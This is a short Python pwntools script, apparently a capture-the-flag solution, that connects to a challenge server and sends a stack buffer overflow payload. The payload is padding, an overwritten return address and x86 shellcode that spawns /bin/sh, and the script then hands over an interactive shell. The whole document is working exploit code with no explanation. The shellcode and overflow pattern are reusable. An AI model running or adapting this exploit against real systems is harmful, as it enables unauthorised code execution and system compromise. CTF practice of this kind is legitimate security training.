from pwn import *

r = remote('challenge.acictf.com', 31813)
#r = process('server')

payload = "HELLO"
payload += "A"*324
print(payload)
payload += p32(0x08048667)
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x00"

r.send(payload)
r.interactive()
